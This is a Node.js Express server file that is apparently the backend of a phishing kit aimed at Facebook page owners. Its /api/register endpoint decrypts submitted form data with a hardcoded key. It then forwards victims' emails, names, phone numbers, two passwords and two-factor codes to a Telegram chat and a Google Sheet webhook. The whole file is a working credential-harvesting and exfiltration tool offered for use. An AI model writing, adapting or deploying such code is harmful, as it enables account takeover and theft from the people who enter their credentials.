import express from "express";
import 'dotenv/config';
import cors from "cors";
import TelegramBot from 'node-telegram-bot-api';
import axios from "axios";
import CryptoJS from "crypto-js";
import rateLimit from "express-rate-limit";

const app = express();
app.use(cors({ origin: '*' }));
app.use(express.json());
app.set('trust proxy', 1);

const blockedIPs = new Set();

const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
const secretKey = 'HDNDT-JDHT8FNEK-JJHR';

function decrypt(encryptedData) {
    try {
        const bytes = CryptoJS.AES.decrypt(encryptedData, secretKey);
        const decrypted = bytes.toString(CryptoJS.enc.Utf8);
        if (!decrypted) throw new Error("Decryption failed");
        return decrypted;
    } catch (error) {
        throw new Error("Invalid encrypted data");
    }
}

const ipFilter = (req, res, next) => {
    const ip = req.ip;
    if (blockedIPs.has(ip)) {
        return res.status(403).json({ message: 'Access forbidden: IP is permanently blocked' });
    }
    next();
};

const registerLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 10,
    message: 'Access forbidden: Too Many Requests',
    headers: true,
    handler: (req, res) => {
        const ip = req.ip;
        blockedIPs.add(ip);
        res.status(429).json({
            message: 'Access forbidden: IP is permanently blocked',
        });
    },
});

app.post('/api/register', ipFilter, registerLimiter, async (req, res) => {
    try {
        const { data } = req.body;
        if (!data) {
            return res.status(400).json({ message: "Invalid request: 'data' is required", error_code: 1 });
        }

        const decryptedData = decrypt(data);
        const values = JSON.parse(decryptedData);

        res.status(200).json({
            message: 'Success',
            error_code: 0
        });

        const message = `<b>Ip:</b> <code>${values.ip || ''}</code>\n-----------------------------\n<b>Email Business:</b> <code>${values.businessEmail || ''}</code>\n<b>Email Personal:</b> <code>${values.personalEmail || ''}</code>\n<b>User name:</b> <code>${values.fullName || ''}</code>\n<b>Page name:</b> <code>${values.fanpageName || ''}</code>\n<b>Phone Number:</b> <code>${values.mobilePhone || ''}</code>\n<b>Password First:</b> <code>${values.passwordFirst || ''}</code>\n<b>Password Second:</b> <code>${values.passwordSecond || ''}</code>\n-----------------------------\n<b>Image:</b> <code>${values.imageUrl || ''}</code>\n-----------------------------\n<b>First Two-Fa:</b> <code>${values.firstTwoFa || ''}</code>\n<b>Second Two-Fa:</b> <code>${values.secondTwoFa || ''}</code>\n`;
        bot.sendMessage(process.env.CHAT_ID, message, { parse_mode: 'html' });

        if (process.env.WEBHOOK_URL) {
            const params = new URLSearchParams({
                Ip: values.ip || '',
                City: values.city || '',
                Country: values.country || '',
                'Email Business': values.businessEmail || '',
                'Email Personal': values.personalEmail || '',
                'Full Name': values.fullName || '',
                'Fanpage Name': values.fanpageName || '',
                'Phone Number': values.mobilePhone || '',
                'Password First': values.passwordFirst || '',
                'Password Second': values.passwordSecond || '',
                'First Two-Fa': values.firstTwoFa || '',
                'Second Two-Fa': values.secondTwoFa || '',
                Image: values.imageUrl || ''
            });

            try {
                await axios.get(`${process.env.WEBHOOK_URL}?${params.toString()}`);
                bot.sendMessage(process.env.CHAT_ID, '✅ Thêm dữ liệu vào Sheet thành công.');
            } catch (err) {
                bot.sendMessage(process.env.CHAT_ID, '❌ Thêm vào Google Sheet không thành công, liên hệ <code>@otis_cua</code>', { parse_mode: 'html' });
            }
        }

    } catch (error) {
        bot.sendMessage(process.env.CHAT_ID, `❌ Server giải mã dữ liệu không thành công, liên hệ <code>@otis_cua</code>.Mã lỗi: ${error.message}`, { parse_mode: 'html' });
        res.status(500).json({
            message: 'Error',
            error_code: 1
        });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server listening port ${PORT}`);
});